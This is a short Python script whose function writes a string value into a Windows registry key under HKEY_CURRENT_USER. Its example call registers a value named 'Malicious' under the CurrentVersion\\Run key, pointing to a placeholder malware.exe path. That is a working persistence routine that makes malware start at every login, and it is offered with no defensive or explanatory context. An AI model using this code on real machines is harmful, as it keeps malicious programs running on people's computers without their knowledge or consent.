import winreg

def modify_registry_value(key_path, value_name, value_data):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
        winreg.CloseKey(key)
        print(f"Registry key {key_path}\\{value_name} modified successfully.")
    except Exception as e:
        print(f"Failed to modify registry key: {str(e)}")

# Example usage
modify_registry_value("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Malicious", "C:\\path\\to\\malware.exe")